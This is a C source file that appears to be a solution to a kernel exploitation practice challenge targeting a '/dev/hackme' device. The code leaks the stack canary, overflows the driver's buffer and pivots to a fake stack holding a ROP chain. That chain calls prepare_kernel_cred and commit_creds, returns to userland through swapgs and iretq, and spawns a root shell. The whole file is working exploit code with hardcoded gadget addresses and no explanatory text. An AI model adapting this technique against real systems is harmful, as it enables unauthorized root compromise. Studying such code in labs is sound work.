#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_cred = 0xffffffff814c6410;
uint64_t pop_rdi_ret = 0xffffffff81006370;
uint64_t pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
uint64_t cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
uint64_t mov_rdi_rax_jne_pop2_ret =  0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
uint64_t swapgs_pop_rbp_ret = 0xffffffff8100a55f;
uint64_t iretq = 0xffffffff8100c0d9;
uint64_t mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
//uint64_t native_write_cr4 = 0xffffffff814443e0;


void spawn_shell(void){
    printf("We back to userland!\n");
    uid_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_state(void){ // save the state of our user context
    __asm__(".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushfq;"
    "pop user_rflags;"
    ".att_syntax;");
}
uint64_t canary(void){
    uint64_t leak[42];
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    read(fd, leak, sizeof(leak));
    return leak[16];
}
void exploit(void){
    uint64_t *fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0); 
    int fake_stack_index = 0x1000 / 8;
    fake_stack[0] = 0xdeadbeef;
    fake_stack[fake_stack_index++] = 0x0; // r12
    fake_stack[fake_stack_index++] = 0x0; // rbp
    fake_stack[fake_stack_index++] = pop_rdi_ret;
    fake_stack[fake_stack_index++] = 0x0; // rdi
    fake_stack[fake_stack_index++] = prepare_kernel_cred;
    fake_stack[fake_stack_index++] = pop_rdx_ret;
    fake_stack[fake_stack_index++] = 0x8;
    fake_stack[fake_stack_index++] = cmp_rdx_jne_pop2_ret;
    fake_stack[fake_stack_index++] = 0x0; // rbx
    fake_stack[fake_stack_index++] = 0x0; // rbp
    fake_stack[fake_stack_index++] = mov_rdi_rax_jne_pop2_ret;
    fake_stack[fake_stack_index++] = 0x0;
    fake_stack[fake_stack_index++] = 0x0;
    fake_stack[fake_stack_index++] = commit_cred; 
    fake_stack[fake_stack_index++] = swapgs_pop_rbp_ret;
    fake_stack[fake_stack_index++] = 0x0; // rbp
    fake_stack[fake_stack_index++] = iretq;
    fake_stack[fake_stack_index++] = user_rip;
    fake_stack[fake_stack_index++] = user_cs;
    fake_stack[fake_stack_index++] = user_rflags;
    fake_stack[fake_stack_index++] = user_sp;
    fake_stack[fake_stack_index++] = user_ss;
    
    
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary();
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = mov_esp_pop2_ret;

 /*   payload[index++] = (uint64_t)pop_rdi_ret; // return address
    payload[index++] = (uint64_t)0x6f0; // set cr4 
    payload[index++] = (uint64_t)privesc; // return address*/ // doesn't work anymore..

    
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}


int main(int argc, char **argv){
    save_state();
    exploit();
    return 0;
}